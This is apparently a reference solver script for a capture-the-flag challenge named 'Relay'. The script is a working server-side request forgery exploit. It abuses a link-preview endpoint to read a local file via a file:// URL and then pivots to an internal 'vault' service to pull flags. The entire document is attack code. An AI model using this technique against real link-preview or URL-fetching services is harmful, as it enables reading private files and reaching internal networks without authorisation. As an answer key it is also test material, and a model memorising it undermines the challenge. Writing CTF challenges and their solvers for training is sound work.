#!/usr/bin/env python3
"""Reference solver for Relay.

Intended path:

1. Find the link-preview fetcher on the edge host.
2. Notice the blocklist only covers loopback spellings, and that no scheme
   restriction was ever written -- read the edge flag through `file://`.
3. Map the internal network the edge host also sits on.
4. Fetch the internal service through the edge host. That request comes from
   the edge host, which is the only thing the vault will ever hear from.
"""
import re
import sys

import requests

FLAG_RE = re.compile(r"destrier\{[0-9a-f]{16,64}\}")
TIMEOUT = 20


def fetch(base_url: str, url: str) -> str:
    r = requests.get(f"{base_url}/preview", params={"url": url}, timeout=TIMEOUT)
    return r.text


def solve(base_url: str, vault_host: str = "vault") -> dict[str, str | None]:
    base_url = base_url.rstrip("/")
    found: dict[str, str | None] = {"edge": None, "vault": None}

    requests.get(f"{base_url}/", timeout=TIMEOUT).raise_for_status()

    # the loopback spellings are refused -- this is the filter, not a wall
    blocked = requests.get(
        f"{base_url}/preview", params={"url": "http://127.0.0.1/"}, timeout=TIMEOUT
    )
    assert blocked.status_code == 400, "expected the loopback filter to reject this"

    # 1. the fetcher was never restricted to http, so it will read a file
    m = FLAG_RE.search(fetch(base_url, "file:///home/relay/edge.txt"))
    found["edge"] = m.group(0) if m else None

    # 2. the pivot: the request originates on the edge host, which is the only
    #    host that sits on the internal network as well as the entry one.
    m = FLAG_RE.search(fetch(base_url, f"http://{vault_host}:9000/records/flag"))
    found["vault"] = m.group(0) if m else None

    return found


if __name__ == "__main__":
    if len(sys.argv) not in (2, 3):
        print(f"usage: {sys.argv[0]} <edge-base-url> [vault-hostname]", file=sys.stderr)
        raise SystemExit(2)

    flags = solve(*sys.argv[1:])
    for host, flag in flags.items():
        print(f"{host:>6}: {flag or 'NOT FOUND'}")
    raise SystemExit(0 if all(flags.values()) else 1)
